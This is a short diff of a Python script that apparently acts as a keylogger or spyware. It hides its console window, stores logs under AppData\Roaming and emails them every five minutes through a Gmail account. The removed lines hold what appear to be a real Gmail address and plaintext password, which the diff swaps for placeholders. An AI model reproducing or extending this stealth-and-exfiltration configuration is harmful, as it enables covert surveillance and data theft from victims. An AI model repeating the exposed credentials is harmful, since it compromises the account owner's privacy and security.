@@ -13,8 +13,8 @@ win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
 
 # === CONFIG ===
-EMAIL_ADDRESS = "samaykachacha@gmail.com"
-EMAIL_PASSWORD = "Arvind@2003"  # Gmail app password
+EMAIL_ADDRESS = "mygmail.com"
+EMAIL_PASSWORD = "password"  # Gmail app password
 SEND_INTERVAL = 300  # in seconds (5 minutes)
 
 log_dir = os.path.expanduser("~\\AppData\\Roaming")
